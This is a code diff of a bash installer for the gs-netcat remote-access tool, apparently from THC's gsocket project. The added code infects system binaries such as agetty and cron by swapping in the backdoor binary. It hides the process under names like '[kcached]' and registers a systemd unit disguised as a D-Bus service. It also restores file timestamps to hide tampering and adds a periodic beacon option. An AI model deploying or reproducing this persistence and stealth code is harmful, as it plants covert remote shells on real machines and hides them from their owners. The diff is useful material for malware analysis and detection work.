@@ -39,10 +39,12 @@
 #		- Specify URL of static binaries, defaults to https://${GS_URL_BASE}/bin
 # GS_DSTDIR="/tmp/foobar/blah"
 #		- Specify custom installation directory
-# GS_HIDDEN_NAME="-bash"
-#       - Specify custom hidden name for process, default is [kcached]
-# GS_BIN_HIDDEN_NAME="gs-dbus"
-#       - Specify custom name for binary on filesystem (default is gs-dbus)
+# GS_BEACON=30
+#       - Only connect back every 30 minutes and check for a client.
+# GS_HIDDEN_NAME="[kcached]"
+#       - Specify custom hidden name file & process.
+# GS_BIN_HIDDEN_NAME="defunct"
+#       - Specify custom name for binary on filesystem
 #       - Set to GS_HIDDEN_NAME if GS_HIDDEN_NAME is specified.
 # GS_DL=wget
 #       - Command to use for download. =wget or =curl.
@@ -133,6 +135,29 @@ PROC_HIDDEN_NAME_RX="${PROC_HIDDEN_NAME_RX:1}"
 # PROC_HIDDEN_NAME_DEFAULT="[rcu_preempt]"
 # ~/.config/<NAME>
 CONFIG_DIR_NAME="htop"
+
+# systemd candidates for binary infection
+# res=$(command -v dbus-daemon) && {
+# 	INFECT_BIN_NAME_ARR+=("${res:?}")
+# 	INFECT_SYSCTL_NAME_ARR+=("dbus")
+# }
+# res=$(command -v /lib/systemd/systemd-journald) && {
+# 	INFECT_BIN_NAME_ARR+=("${res:?}")
+# 	INFECT_SYSCTL_NAME_ARR+=("systemd-journald")
+# }
+# res=$(command -v /lib/systemd/systemd-udevd) && {
+# 	INFECT_BIN_NAME_ARR+=("${res:?}")
+# 	INFECT_SYSCTL_NAME_ARR+=("systemd-udevd")
+# }
+# => Only main pid is allowed to signal systemd
+res=$(command -v agetty) && {
+	INFECT_BIN_NAME_ARR+=("${res:?}")
+	INFECT_SYSCTL_NAME_ARR+=("getty@tty1")
+}
+res=$(command -v cron) && {
+	INFECT_BIN_NAME_ARR+=("${res:?}")
+	INFECT_SYSCTL_NAME_ARR+=("cron")
+}
 
 # Names for 'uninstall' (including names from previous versions)
 BIN_HIDDEN_NAME_RM=("$BIN_HIDDEN_NAME_DEFAULT" "gs-dbus" "gs-db")
@@ -268,6 +293,7 @@ _ts_get_ts()
 	local fn
 	local n
 	local pdir
+	local oldest
 	fn="$1"
 	pdir="$(dirname "$1")"
 
@@ -307,31 +333,31 @@ _ts_add()
 	_ts_mkdir_fn_a+=("$2")
 }
 
-# Note: Do not use global _ts variables except _ts_add_direct
+# Return 0 if not yet marked. Error if already marked.
+_ts_add_pdir() {
+	local pdir="$(dirname "${1:?}")"
+	ts_is_marked "$pdir" && return 200
+
+	_ts_add "$pdir" "<NOT BY ADD_PDIR>"
+}
+
+# Note: Do not use global _ts variables except _ts_ts
 # Usage: mk_file [filename]
 mk_file()
 {
 	local fn
-	local oldest
-	local pdir
 	local pdir_added
 	fn="$1"
 	local exists
 
 	# DEBUGF "${CC}MK_FILE($fn)${CN}"
-	pdir="$(dirname "$fn")"
+	_ts_add_pdir "$fn" && pdir_added=1
+
 	[[ -e "$fn" ]] && exists=1
-
-	ts_is_marked "$pdir" || {
-		# HERE: Parent not tracked
-		_ts_add "$pdir" "<NOT BY XMKDIR>"
-		pdir_added=1
-	}
-
 	ts_is_marked "$fn" || {
 		# HERE: Not yet tracked
 		_ts_get_ts "$fn"
-		# Do not add creation fails.
+		# Do not add if creation fails.
 		touch "$fn" 2>/dev/null || {
 			# HERE: Permission denied
 			[[ -n "$pdir_added" ]] && {
@@ -363,13 +389,9 @@ xrmdir()
 	fn="$1"
 
 	[[ ! -d "$fn" ]] && return
-	pdir="$(dirname "$fn")"
+	_ts_add_pdir "$fn"
 
-	ts_is_marked "$pdir" || {
-		_ts_add "$pdir" "<RMDIR-UNTRACKED>"
-	}
-
-	rmdir "$fn" 2>/dev/null
+	rmdir "${fn:?}" 2>/dev/null
 }
 
 xrm()
@@ -379,14 +401,9 @@ xrm()
 	fn="$1"
 
 	[[ ! -f "$fn" ]] && return
-	pdir="$(dirname "$fn")"
+	_ts_add_pdir "$fn"
 
-	ts_is_marked "$pdir" || {
-		# HERE: Parent is not tracked.
-		_ts_add "$pdir" "<RM-UNTRACKED>"
-	}
-
-	rm -f "$1" 2>/dev/null
+	rm -f "${fn:?}" 2>/dev/null
 }
 
 # Create a directory if it does not exist and fix timestamp
@@ -423,28 +440,25 @@ xmkdir()
 
 xcp()
 {
-	local src
-	local dst
-	src="$1"
-	dst="$2"
+	local src="$1"
+	local dst="$2"
 
 	# DEBUGF "${CG}XCP($src, $dst)${CN}"
 	mk_file "$dst" || return
 	cp "$src" "$dst" || return
-	true
+	return 0
 }
 
-xmv()
-{
-	local src
-	local dst
-	src="$1"
-	dst="$2"
+xmv() {
+	local src="$1"
+	local dst="$2"
 
-	[[ -e "$dst" ]] && xrm "$dst"
-	xcp "$src" "$dst" || return
-	xrm "$src"
-	true
+	_ts_add_pdir "$dst"
+	_ts_add_pdir "$src"
+	[[ -e "$dst" ]] && rm -f "$dst"
+
+	mv "$src" "$dst"
+	return 0
 }
 
 clean_all()
@@ -853,9 +867,9 @@ init_setup()
 		mkdir -p "${GS_PREFIX}/usr/bin" 2>/dev/null
 		mkdir -p "${GS_PREFIX}${HOME}" 2>/dev/null
 		if [[ -f "${HOME}/${RC_FN_LIST[1]}" ]]; then
-			xcp -p "${HOME}/${RC_FN_LIST[1]}" "${GS_PREFIX}${HOME}/${RC_FN_LIST[1]}"
+			cp -p "${HOME}/${RC_FN_LIST[1]}" "${GS_PREFIX}${HOME}/${RC_FN_LIST[1]}"
 		fi
-		xcp -p /etc/rc.local "${GS_PREFIX}/etc/"
+		cp -p /etc/rc.local "${GS_PREFIX}/etc/"
 	fi
 
 	command -v tar >/dev/null || errexit "Need tar. Try ${CM}apt install tar${CN}"
@@ -956,11 +970,25 @@ uninstall_service()
 		ts_add_systemd "${WANTS_DIR}/multi-user.target.wants"
 		# STOPPING would kill the current login shell. Do not stop it.
 		# systemctl stop "${SERVICE_HIDDEN_NAME}" &>/dev/null
-		systemctl disable "${sn}" 2>/dev/null && systemd_kill_cmd+=";systemctl stop ${sn}"
+		systemctl disable "${sn}" 2>/dev/null && systemd_kill_cmd+="systemctl stop ${sn}"
 	}
 
 	uninstall_rm "${sf}"
-} 
+}
+
+uninstall_systemd_infect() {
+	local name="$1"
+	local fn="$2"
+	local bn
+	
+	bn=$(basename "${fn}")
+
+	[[ ! -f "${fn} " ]] && return 0
+
+	echo "Disinfecting ${fn}..."
+	xmv "${fn} " "${fn}"
+	cmd_kill_arr+=("${bn}")
+}
 
 # Rather important function especially when testing and developing this...
 uninstall()
@@ -968,6 +996,8 @@ uninstall()
 	local hn
 	local fn
 	local cn
+
+	cmd_kill_arr=("${BIN_HIDDEN_NAME}")
 	for hn in "${BIN_HIDDEN_NAME_RM[@]}"; do
 		for cn in "${CONFIG_DIR_NAME_RM[@]}"; do
 			uninstall_rm "${GS_PREFIX}${HOME}/.config/${cn}/${hn}"
@@ -1023,10 +1053,21 @@ uninstall()
 		}
 	fi
 
-	[[ $UID -eq 0 ]] && systemctl daemon-reload 2>/dev/null
+	i=0
+	while [[ $i -lt "${#INFECT_BIN_NAME_ARR[@]}" ]]; do
+		uninstall_systemd_infect "${INFECT_SYSCTL_NAME_ARR[$i]}" "${INFECT_BIN_NAME_ARR[$i]}"
+		((i++))
+	done
 
 	echo -e "${CG}Uninstall complete.${CN}"
-	echo -e "--> Use ${CM}${KL_CMD:-pkill} ${BIN_HIDDEN_NAME}${systemd_kill_cmd}${CN} to terminate all running shells."
+
+	[[ -n "$systemd_kill_cmd" ]] && systemctl daemon-reload 2>/dev/null
+
+	echo -en "--> Use ${CM}"
+	for x in "${cmd_kill_arr[@]}"; do
+		echo -n "${KL_CMD:-pkill} $x;"
+	done
+	echo -e "${systemd_kill_cmd}${CN} to terminate all running shells."
 	exit_code 0
 }
 
@@ -1111,42 +1152,78 @@ gs_secret_write()
 	echo "$GS_SECRET" >"$1" || return
 }
 
+# Return 200 if already infected.
+# Return 0 on success.
+infect_bin() {
+	local bin="$1"
+	[[ ! -f "$bin" ]] && { SKIP_OUT "Not found: ${bin}."; return 255; }
+	local ret
 
-install_system_systemd()
-{
-	[[ ! -d "${SERVICE_DIR}" ]] && return
-	command -v systemctl >/dev/null || return
-	# test for:
-	# 1. offline
-	# 2. >&2 Failed to get D-Bus connection: Operation not permitted <-- Inside docker
-	[[ "$(systemctl is-system-running 2>/dev/null)" =~ (offline|^$) ]] && return
+	# Check if target binary is already GSNC
+	ret=$(GS_STEALTH=1 GS_CONFIG_READ="${bin}" GS_CONFIG_CHECK=1 "${DSTBIN}" -h 2>/dev/null)
+	# Old binary outputs 'uname -a' on -h. New binary output GS_SECRET.
+	[[ $ret == *" "* ]] && {
+		SKIP_OUT "Old gs-netcat binary. Infection not supported."
+		return 255
+	}
+	[[ -n "$ret" ]] && {
+		GS_SECRET="$ret"
+		((IS_INSTALLED+=1))
+		IS_SKIPPED=1
+		SKIP_OUT "Already infected."
+		return 200
+	}
+
+	# Broken old install?
+	[[ -f "${bin} " ]] && errexit 254 "File '${bin} ' already exists. Remove it if '${bin}' is really the original."
+
+	# Restore timestamp of this file:
+	_ts_add "${bin}"
+	# Can not overwrite a running binary. First move it away:
+	xmv "${bin}" "${bin} " || { FAIL_OUT "Could not move ${bin}."; return 255; }
+	# Copy it back so that we retain permissions
+	cp -p "${bin} " "${bin}" || {
+		xmv "${bin} " "${bin}" # Try to recover...
+		FAIL_OUT "Could not move '${bin} ' to '${bin}'."
+		return 255
+	}
+
+	(cat "${DSTBIN}"; TERM=xterm-256color GS_STEALTH=1 GS_CONFIG_WRITE=- GS_ARGS="-liq" GS_SECRET="${GS_SECRET:?}" "${DSTBIN}") >"${bin}" || { 
+		xmv "${bin} " "${bin}" # Try to recover...
+		FAIL_OUT "Could not copy"
+		return 255
+	}
+}
+
+
+install_systemd_new() {
+	local str
+
+	printf "%-70.70s" "Installing as systemd ${SERVICE_HIDDEN_NAME}.service.............................................."
+
 	if [[ -f "${SERVICE_FILE}" ]]; then
 		((IS_INSTALLED+=1))
 		IS_SKIPPED=1
-		if systemctl is-active "${SERVICE_HIDDEN_NAME}" &>/dev/null; then
-			IS_GS_RUNNING=1
-		fi
+		systemctl is-active "${SERVICE_HIDDEN_NAME}" &>/dev/null && IS_GS_RUNNING=1
 		IS_SYSTEMD=1
 		SKIP_OUT "${SERVICE_FILE} already exists."
-		return
+		return 0
 	fi
 
 	# Create the service file
-	mk_file "${SERVICE_FILE}" || return
+	mk_file "${SERVICE_FILE}" || return 255
 	chmod 644 "${SERVICE_FILE}" # Stop 'is marked world-inaccessible' dmesg warnings.
 	echo "[Unit]
 Description=D-Bus System Connection Bus
 After=network.target
 
 [Service]
-Type=simple
 Restart=always
 RestartSec=300
-WorkingDirectory=/root
 ExecStart=/bin/bash -c \"${ENV_LINE[*]}GS_ARGS='-k $SYSTEMD_SEC_FILE -ilq' exec -a '${PROC_HIDDEN_NAME}' '${DSTBIN}'\"
 
 [Install]
-WantedBy=multi-user.target" >"${SERVICE_FILE}" || return
+WantedBy=multi-user.target" >"${SERVICE_FILE}" || return 255
 
 	gs_secret_write "$SYSTEMD_SEC_FILE"
 	ts_add_systemd "${WANTS_DIR}/multi-user.target.wants"
@@ -1156,7 +1233,69 @@ WantedBy=multi-user.target" >"${SERVICE_FILE}" || return
 
 	IS_SYSTEMD=1
 	((IS_INSTALLED+=1))
+	OK_OUT
 }
+
+
+# infect cron.services et.al.
+install_systemd_infect() {
+	local name="$1"
+	local bin="$2"
+	# local svfile="/lib/systemd/system/${name}.service"
+	local str
+	local ret
+
+	printf "%-70.70s" "Infecting ${bin}....................................................................."
+
+	# Bail is target service is in a bad state
+	# [[ ! -f "$svfile" ]] && { FAIL_OUT "File not found: ${svfile}"; return 255; }
+	systemctl is-active "$name" &>/dev/null || { SKIP_OUT "${CDC}systemctl status $name${CN} is reporting a bad state."; return 255; }
+
+	infect_bin "$bin"
+	ret=$?
+	[[ $ret -eq 200 ]] && { IS_SYSTEMD=1; IS_GS_RUNNING=1; }  # Dont do any crontab infection
+	[[ $ret -ne 0 ]] && return 255
+
+	SYSTEMD_INFECTED_NAME="${name}"
+	IS_SYSTEMD=1
+	((IS_INSTALLED+=1))
+	OK_OUT
+	STARTING_STR="Starting gs-netcat as infected '${name}.service'"
+}
+
+install_system_systemd()
+{
+	local i
+	[[ ! -d "${SERVICE_DIR}" ]] && return 255
+	command -v systemctl >/dev/null || return 255
+
+	# test for:
+	# 1. offline
+	# 2. >&2 Failed to get D-Bus connection: Operation not permitted <-- Inside docker
+	[[ "$(systemctl is-system-running 2>/dev/null)" =~ (offline|^$) ]] && return
+
+	if [[ -n $GS_INFECT ]]; then
+		i=0
+		while [[ -z $IS_INSTALLED ]] && [[ $i -lt ${#INFECT_BIN_NAME_ARR[@]} ]]; do
+			install_systemd_infect "${INFECT_SYSCTL_NAME_ARR[$i]}" "${INFECT_BIN_NAME_ARR[$i]}"
+			((i++))
+		done
+	else
+		printf "%-70.70s" "Infecting systemd service....................................................................."
+		SKIP_OUT "GS_INFECT=1 not set"
+	fi
+
+	[[ -n "$IS_INSTALLED" ]] && {
+		xrm "${DSTBIN}"
+		return 0
+	}
+
+	install_systemd_new
+	[[ -n "$IS_INSTALLED" ]] && return 0
+
+	return 255
+}
+
 
 
 # inject a string ($2-) into the 2nd line of a file and retain the
@@ -1198,23 +1337,24 @@ install_system_rclocal()
 	gs_secret_write "$RCLOCAL_SEC_FILE"
 
 	((IS_INSTALLED+=1))
+	OK_OUT
 }
 
 install_system()
 {
-	echo -en "Installing systemwide remote access permanentally....................."
-
 	# Try systemd first
 	install_system_systemd
 
 	# Try good old /etc/rc.local
 	[[ -z "$IS_INSTALLED" ]] && install_system_rclocal
 
-	[[ -z "$IS_INSTALLED" ]] && { FAIL_OUT "no systemctl or /etc/rc.local"; return; }
+	[[ -z "$IS_INSTALLED" ]] && { 
+		echo -en "Installing systemwide remote access permanentally....................."
+		FAIL_OUT "no systemctl or /etc/rc.local"
+		return
+	}
 
 	[[ -n $IS_SKIPPED ]] && return
-	
-	OK_OUT
 }
 
 install_user_crontab()
@@ -1331,6 +1471,12 @@ dl_ssl()
 dl()
 {
 	# Debugging / testing. Use local package if available
+
+	[[ -n "$GS_USELOCAL_GSNC" ]] && {
+		xcp "$GS_USELOCAL_GSNC" "${2}" && return
+		FAIL_OUT "GS_USELOCAL_GSNC set but does not exists..."
+		errexit
+	}
 	if [[ -n "$GS_USELOCAL" ]]; then
 		[[ -f "../packaging/gsnc-deploy-bin/${1}" ]] && xcp "../packaging/gsnc-deploy-bin/${1}" "${2}" 2>/dev/null && return
 		[[ -f "/gsocket-pkg/${1}" ]] && xcp "/gsocket-pkg/${1}" "${2}" 2>/dev/null && return
@@ -1433,7 +1579,7 @@ test_network()
 		FAIL_OUT
 		[[ -n "$ERR_LOG" ]] && echo >&2 "$ERR_LOG"
 		# EXIT if we can not check if SECRET has already been used.
-		errexit "Cannot connect to GSRN. Firewalled? Try GS_PORT=53 or 22, 7350 or 67."
+		errexit "Cannot connect to GSRN. Firewalled? Try GS_PORT=53 or 22, 25, 67 or 7350."
 	}
 
 	# Pre <= 1.4.40 return with 255 if transparent proxy resets connection after 12 sec.
@@ -1566,26 +1712,47 @@ try()
 gs_start_systemd()
 {
 	# HERE: It's systemd
-	if [[ -z "$IS_GS_RUNNING" ]]; then
-		# Resetting the Timestamp will yield a systemctl status warning that daemon-reload
-		# is needed. Thus fix Timestamp here and reload.
-		clean_all
-		systemctl daemon-reload
-		systemctl restart "${SERVICE_HIDDEN_NAME}" &>/dev/null
-		if ! systemctl is-active "${SERVICE_HIDDEN_NAME}" &>/dev/null; then
-			FAIL_OUT "Check ${CM}systemctl start ${SERVICE_HIDDEN_NAME}${CN}."
+
+	[[ -n "$IS_GS_RUNNING" ]] && {
+		SKIP_OUT "'${BIN_HIDDEN_NAME}' is already running and hidden as '${PROC_HIDDEN_NAME}'."
+		return
+	}
+
+	[[ -n "$SYSTEMD_INFECTED_NAME" ]] && {
+		systemctl restart "$SYSTEMD_INFECTED_NAME" &>/dev/null
+		if ! systemctl is-active "${SYSTEMD_INFECTED_NAME}" &>/dev/null; then
+			FAIL_OUT "Check ${CM}systemctl status ${SYSTEMD_INFECTED_NAME}${CN}."
 			exit_code 255
 		fi
 		IS_GS_RUNNING=1
 		OK_OUT
 		return
-	fi
+	}
 
-	SKIP_OUT "'${BIN_HIDDEN_NAME}' is already running and hidden as '${PROC_HIDDEN_NAME}'."
+	# Resetting the Timestamp will yield a systemctl status warning that daemon-reload
+	# is needed. Thus fix Timestamp here and reload.
+	clean_all
+	systemctl daemon-reload
+	systemctl restart "${SERVICE_HIDDEN_NAME}" &>/dev/null
+	if ! systemctl is-active "${SERVICE_HIDDEN_NAME}" &>/dev/null; then
+		FAIL_OUT "Check ${CM}systemctl status ${SERVICE_HIDDEN_NAME}${CN}."
+		exit_code 255
+	fi
+	IS_GS_RUNNING=1
+	OK_OUT
+	return
 }
 
 gs_start()
 {
+	[[ -n $IS_GS_RUNNING ]] && return
+
+	printf "%-70.70s" "${STARTING_STR}....................................................."
+	if [[ -n "$GS_NOSTART" ]]; then
+		SKIP_OUT "GS_NOSTART=1 is set."
+		return
+	fi
+
 	# If installed as systemd then try to start it
 	[[ -n "$IS_SYSTEMD" ]] && gs_start_systemd
 	[[ -n "$IS_GS_RUNNING" ]] && return
@@ -1664,17 +1831,16 @@ fi
 
 try "$OSARCH" "$SRC_PKG"
 
-# [[ -z "$GS_OSARCH" ]] && [[ -z "$IS_TESTBIN_OK" ]] && try_any
 WARN_EXECFAIL
 [[ -z "$IS_TESTBIN_OK" ]] && errexit "None of the binaries worked."
 
 [[ -z $S ]] && try_network
-# [[ -n "$GS_UPDATE" ]] && gs_update
 
 # S= is set. Do not install but connect to remote using S= as secret.
 [[ -n "$S" ]] && gs_access
 
 # -----BEGIN Install permanentally-----
+STARTING_STR="Starting '${BIN_HIDDEN_NAME}' as hidden process '${PROC_HIDDEN_NAME}'"
 if [[ -z $GS_NOINST ]]; then
 	if [[ -n $IS_DSTBIN_TMP ]]; then
 		echo -en "Installing remote access.............................................."
@@ -1701,13 +1867,7 @@ webhooks
 
 HOWTO_CONNECT_OUT
 
-printf "%-70.70s" "Starting '${BIN_HIDDEN_NAME}' as hidden process '${PROC_HIDDEN_NAME}'....................................."
-if [[ -n "$GS_NOSTART" ]]; then
-	SKIP_OUT "GS_NOSTART=1 is set."
-else
-	gs_start
-fi
-
+gs_start
 echo -e "--> ${CW}Join us on Telegram - https://t.me/thcorg${CN}"
 
 exit_code 0
